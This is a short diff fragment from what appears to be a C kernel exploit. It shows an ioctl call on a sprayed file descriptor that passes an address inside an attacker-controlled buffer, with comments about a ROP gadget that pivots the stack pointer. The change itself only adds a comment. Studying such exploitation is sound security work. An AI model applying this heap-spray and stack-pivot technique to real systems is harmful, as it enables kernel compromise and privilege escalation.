@@ -120,7 +120,7 @@ int main() {
   // Subtract 16 bytes to the value assigned to RDX, later pop'ed into RSP,
   // since we need to make space in the stack for the two later pops (pop r13;
   // pop rbp) in rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp
-  ioctl(spray[50], 0xdeadbeef, g_buf - 0x10);
+  ioctl(spray[50], 0xdeadbeef, g_buf - 0x10 /* rdx */);
 
   getchar();
   return 0;
